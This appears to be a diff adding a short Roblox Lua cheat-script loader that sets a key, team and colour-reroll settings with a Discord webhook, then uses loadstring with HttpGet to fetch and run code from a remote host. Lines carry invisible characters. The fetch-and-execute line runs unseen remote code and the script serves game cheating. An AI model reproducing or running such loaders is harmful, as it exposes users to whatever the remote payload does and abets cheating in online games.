@@ -1,0 +1,14 @@
+getgenv().Key = "porry_df86a180ebdc6497a705255e6"
+‎
+‎_G.Team = "CCG" --CCG/Ghoul
+‎_G.Settings = {
+‎    Primary = "Really black",
+‎    Secondary = "Really black",
+‎    AutoSave = true, -- Auto Save when got above ^
+‎    CommonColor = true, -- Stop at Really black, Pure
+‎    Webhook = true, -- Enable Webhook 
+‎    PingEveryone = false,
+‎    URL = "https://discord.com/api/webhooks/" -- Webhook URL
+‎}
+‎
+‎loadstring(game:HttpGet("https://pandadevelopment.net/virtual/file/4dfd819c8b24288a"))()
